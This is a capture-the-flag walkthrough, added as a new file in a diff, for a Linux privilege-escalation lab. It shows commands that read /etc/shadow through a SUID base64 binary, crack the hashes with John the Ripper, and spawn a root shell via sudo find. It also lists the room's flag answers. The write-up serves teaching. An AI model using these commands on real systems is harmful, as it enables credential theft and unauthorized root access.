@@ -1,0 +1,118 @@
+Overview
+
+In this room, we start with SSH access as a low-privileged user and try to escalate privileges to root.
+
+Initial Access
+
+We log in using the given credentials:
+
+ssh leonard@<target-ip>
+
+This command connects to the target machine using SSH.
+
+Enumeration
+
+First step is to check basic privileges:
+
+sudo -l
+
+This shows what commands the current user can run as root. In this case, nothing useful.
+
+Checking Users
+cat /etc/passwd
+
+Displays all system users.
+
+cat /etc/passwd | cut -d ":" -f 1
+
+Extracts only usernames from the file.
+
+Searching for World-Writable Files
+find / -type f -perm 0777 2>/dev/null
+
+Finds files that anyone can read/write/execute.
+2>/dev/null hides permission errors.
+
+Nothing useful found.
+
+Searching for SUID Binaries
+find / -perm -u=s -type f 2>/dev/null
+
+Finds files with SUID bit set.
+SUID allows a file to run with owner privileges (often root).
+
+We find an interesting binary: base64.
+
+Exploiting SUID (base64)
+base64 /etc/shadow | base64 --decode
+
+Reads the protected /etc/shadow file using base64.
+
+This works because base64 runs with elevated privileges.
+
+Extracting Credentials
+base64 /etc/passwd | base64 --decode > passwd.txt
+base64 /etc/shadow | base64 --decode > shadow.txt
+
+Save both files locally.
+
+unshadow passwd.txt shadow.txt > passwords.txt
+
+Combines them into a format usable by cracking tools.
+
+Cracking Passwords
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+
+Uses John the Ripper to crack hashes using a wordlist.
+
+Result:
+
+Password1 (missy)
+Switching User
+su missy
+
+Switch to user missy.
+
+Enter the cracked password.
+
+Finding First Flag
+cd /home/missy
+ls
+
+Navigate to user directory.
+
+cat flag1.txt
+
+Reads the first flag.
+
+Privilege Escalation
+
+Check sudo again:
+
+sudo -l
+
+Output shows:
+
+(ALL) NOPASSWD: /usr/bin/find
+
+This means we can run find as root without password.
+
+Exploiting find (GTFOBins)
+sudo find -exec /bin/sh \; -quit
+
+Runs a shell using find with root privileges.
+
+Now we have root access.
+
+Finding Root Flag
+find / -name flag2.txt 2>/dev/null
+
+Search for second flag.
+
+cat <path_to_flag>
+
+Reads the flag.
+
+Final Flags
+flag1: THM-42828719920544
+flag2: THM-168824782390238
